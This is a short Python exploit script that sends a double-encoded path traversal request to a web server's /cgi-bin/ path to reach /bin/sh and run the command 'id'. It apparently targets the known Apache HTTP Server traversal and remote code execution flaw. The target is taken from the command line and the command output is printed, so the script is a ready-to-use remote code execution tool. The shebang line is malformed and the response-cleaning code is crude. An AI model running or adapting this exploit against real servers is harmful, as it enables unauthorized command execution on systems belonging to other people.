#!/bin/bash env python3

import requests
import urllib
import re
import socket
import sys

'''Author code : Jhonson '''

def main(url, dir,cmd, header):

    
      
      ii=url.strip()+dir
     
      parser = urllib.parse.urlparse(ii)
      client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      client_socket.connect((parser.hostname, parser.port))
      data = f"POST {parser.path if parser.path else '/'} HTTP/1.1\r\n" \
               f"Host: {parser.hostname}\r\n" \
               f"Content-Type: application/x-www-form-urlencoded\r\n" \
               f"Content-Length: {len(cmd)}\r\n" \
               f"\r\n" \
               f"{cmd}\r\n"
      client_socket.sendall(data.encode())
      response = b""
      while True:
        part = client_socket.recv(4096)
        if not part:
          break
        response += part

        var=response.decode()
        body = re.sub(r'^.*?\r\n\r\n','', var, flags=re.DOTALL)
        
               

        print(body.strip('2d\r\n\r\n\r\n0')) 
          
        
                   

if __name__=='__main__':

   UA = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"}
   payload="/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

   target=sys.argv[1]   
   data = "echo;id"
   
   main(target, payload,data, UA)
